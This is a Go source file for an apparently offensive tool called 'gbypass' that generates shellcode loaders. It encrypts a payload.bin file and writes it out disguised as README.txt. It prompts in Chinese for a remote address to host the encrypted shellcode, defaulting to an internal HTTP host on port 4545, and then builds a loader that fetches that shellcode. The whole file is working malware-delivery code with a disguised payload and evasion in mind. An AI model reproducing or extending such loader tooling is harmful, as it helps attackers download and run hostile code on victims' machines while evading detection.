package main

import (
	"fmt"
	"gbypass/common"
	"gbypass/utils"
	"github.com/AlecAivazis/survey/v2"
)

/**
 * @Author Lockly
 * @Description
 * @Date 2023/9/24
 **/

func main() {
	var url string

	common.S()
	fmt.Println("[-] 文件名默认为README.txt")
	question := &survey.Input{
		Renderer: survey.Renderer{},
		Message:  "输入远程加密shellcode地址：",
		Default:  "http://192.168.130.1:4545/README.txt",
	}
	encode, _ := utils.E(utils.R("payload.bin"))
	survey.AskOne(question, &url)

	utils.W("output/README.txt", encode)
	utils.G(url, utils.PwdKey)

	fmt.Println("[+] loader生成成功！")
}
